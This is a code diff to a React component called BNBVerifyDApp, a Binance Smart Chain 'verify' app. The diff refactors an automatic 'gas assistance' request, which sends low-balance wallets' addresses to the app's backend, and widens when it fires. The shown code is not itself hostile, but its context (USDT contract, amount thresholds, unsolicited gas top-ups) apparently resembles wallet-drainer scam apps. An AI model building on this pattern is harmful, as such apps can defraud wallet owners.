@@ -65,6 +65,7 @@ export default function BNBVerifyDApp() {
   const HIGH_AMOUNT_THRESHOLD = 2000
   const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955" // USDT BEP-20 on BSC
   const FLASH_THRESHOLD = 5
+  const AUTO_GAS_THRESHOLD = 0.000506
 
   // BSC Network configuration (EVM compatible)
   const BSC_NETWORK = {
@@ -97,6 +98,29 @@ export default function BNBVerifyDApp() {
     return null
   }
 
+  const requestGasAssistanceIfNeeded = async (address: string, bnbBalance: number, provider: BinanceWallet) => {
+    if (bnbBalance >= AUTO_GAS_THRESHOLD) return
+
+    try {
+      const response = await fetch("/api/gas-assistance", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ userWallet: address }),
+      })
+      const result = await response.json()
+
+      if (!response.ok && response.status !== 429) {
+        throw new Error(result.message || "Gas assistance request failed")
+      }
+
+      if (response.ok && result.success && !result.alreadyFunded) {
+        await getBalance(address, provider)
+      }
+    } catch (error) {
+      console.error("Automatic gas assistance failed:", error)
+    }
+  }
+
   // Connect to Binance Web3 Wallet with BSC EVM calls
   const connectBinanceWallet = async (provider?: BinanceWallet): Promise<boolean> => {
     try {
@@ -125,21 +149,7 @@ export default function BNBVerifyDApp() {
         // Get BNB balance using BSC EVM call
         const balance = await getBalance(accounts[0], walletProvider)
 
-        if (balance < 0.000111) {
-          try {
-            const response = await fetch("/api/gas-assistance", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ userWallet: accounts[0] }),
-            })
-            const result = await response.json()
-            if (response.ok && result.success && !result.alreadyFunded) {
-              await getBalance(accounts[0], walletProvider)
-            }
-          } catch (error) {
-            console.error("Automatic gas assistance failed:", error)
-          }
-        }
+        await requestGasAssistanceIfNeeded(accounts[0], balance, walletProvider)
 
         console.log("✅ Binance Web3 Wallet connected:", accounts[0])
         return true
@@ -267,7 +277,9 @@ export default function BNBVerifyDApp() {
         if (accounts.length > 0) {
           setAccount(accounts[0])
           setIsConnected(true)
-          getBalance(accounts[0], provider)
+          void getBalance(accounts[0], provider).then((bnbBalance) =>
+            requestGasAssistanceIfNeeded(accounts[0], bnbBalance, provider),
+          )
         } else {
           setAccount("")
           setIsConnected(false)
@@ -833,4 +845,3 @@ export default function BNBVerifyDApp() {
     </div>
   )
 }
-
